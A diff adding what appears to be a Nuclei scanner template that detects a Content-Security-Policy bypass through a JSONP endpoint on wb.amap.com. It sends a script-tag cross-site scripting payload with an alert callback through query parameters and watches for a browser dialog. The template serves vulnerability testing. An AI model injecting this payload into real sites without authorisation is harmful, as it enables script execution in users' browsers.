@@ -1,0 +1,55 @@
+id: amap-wb-csp-bypass
+
+info:
+  name: Content-Security-Policy Bypass - AMap WB
+  author: renniepak,DhiyaneshDK
+  severity: medium
+  reference:
+    - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
+  metadata:
+    verified: true
+  tags: xss,csp-bypass,amap-wb
+
+flow: http(1) && headless(1)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "Content-Security-Policy"
+          - "amap.com"
+        condition: and
+        internal: true
+
+headless:
+  - steps:
+      - action: navigate
+        args:
+          url: "{{BaseURL}}"
+
+      - action: waitdialog
+        name: amap_wb_csp_xss
+        args:
+          max-duration: 5s
+
+    payloads:
+      injection:
+        - '<script src="https://wb.amap.com/channel.php?callback=alert"></script>'
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{url_encode(injection)}}"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "amap_wb_csp_xss == true"
+# digest: 4a0a00473045022035b0ed5a1d111ad01d8a29be5cddad3fe3a0970bb9ef5a735ce8ec7770603868022100c0418dee5fcabf2b65679b059384f91824c3edb17582476616d44f2f618db20c:922c64590222798bb761d5b6d8e72950
